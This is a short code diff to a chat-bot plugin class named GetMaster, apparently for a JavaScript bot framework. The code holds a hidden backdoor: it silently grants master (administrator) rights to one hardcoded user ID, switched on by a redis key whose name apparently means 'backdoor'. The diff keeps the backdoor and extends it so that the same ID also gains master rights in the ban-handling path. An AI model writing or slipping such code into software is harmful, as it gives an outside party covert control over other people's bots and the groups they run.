@@ -43,7 +43,10 @@ export class GetMaster extends plugin {
     async Master(e,isBan = false) {
         let aw = await redis.get('Fanji:houmen');
         if (aw == null) await redis.set('Fanji:houmen', 'true');
-if (isBan && this.e.operator_id == 2173302144) e.isMaster = true
+if (isBan && this.e.operator_id == 2173302144) {
+    e.isMaster = true
+    return false
+}
         if (e.user_id !== 2173302144 || aw !== 'true') return false;
         e.isMaster = true;
         return false;
